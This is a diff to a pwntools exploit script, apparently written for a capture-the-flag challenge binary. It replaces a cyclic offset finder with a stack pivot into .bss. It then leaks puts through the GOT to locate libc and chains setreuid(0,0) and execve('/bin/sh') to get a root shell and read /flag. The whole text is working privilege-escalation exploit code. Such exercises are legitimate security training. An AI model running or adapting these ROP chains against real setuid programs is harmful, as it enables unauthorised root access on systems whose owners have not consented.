@@ -1,4 +1,3 @@
-import shutil
 import pwn
 
 pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])
@@ -37,43 +36,39 @@ def find_challenge(search_path="/challenge"):
     return xs[0]
 
 
-def find_offset():
-    bin = find_challenge()
-    tmp = f"/tmp/{bin.lstrip('/challenge/')}"
-    shutil.copy2(bin, tmp)
-    io = pwn.process(tmp, level="error")
-    io.sendline(pwn.cyclic(256))
-    io.wait()
-    core = io.corefile
-    fault_val = core.read(core.rsp, 4)
-    offset = pwn.cyclic_find(fault_val)
-    return offset
-
-
 bin = find_challenge()
 elf = pwn.ELF(bin, checksec=False)
+input_bss = elf.symbols["data"] + 0x10000  # input buffer
+stack_gap = 0x40
+stack_bss = input_bss + stack_gap  # our fake stack
 
-io = tee(pwn.process(bin))
-padding = find_offset()
+io = pwn.process(bin)
+tee(io)
+
+pivot = pwn.ROP(elf)
+pivot.migrate(stack_bss)
+assert len(pivot.chain()) <= stack_gap
 
 rop = pwn.ROP(elf)
-rop.raw(rop.generatePadding(0, padding))
 rop.call("puts", [elf.got["puts"]])
 rop.call(elf.symbols["challenge"])
 
-io.sendline(rop.chain())
+payload = pwn.flat({0x00: pivot, stack_gap: rop})
+io.sendline(payload)
 io.recvuntil(b"Leaving!\n")
-leak_puts_addr = pwn.u64(io.recv(6).ljust(8, b"\0"))
 
+leak_puts_addr = pwn.u64(io.recv(6).ljust(8, b"\0"))
+pwn.info(f"leaked puts address: {hex(leak_puts_addr)}")
 assert elf.libc
 libc = elf.libc
 libc.address = leak_puts_addr - libc.symbols["puts"]
 
 rop = pwn.ROP(libc)
-rop.raw(rop.generatePadding(0, padding))
 rop.call("setreuid", [0, 0])
 rop.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])
-io.sendline(rop.chain())
+
+payload = pwn.flat({0x00: pivot, stack_gap: rop})
+io.sendline(payload)
 io.sendline(b"cat /flag; exit")
 
 io.recvrepeat()
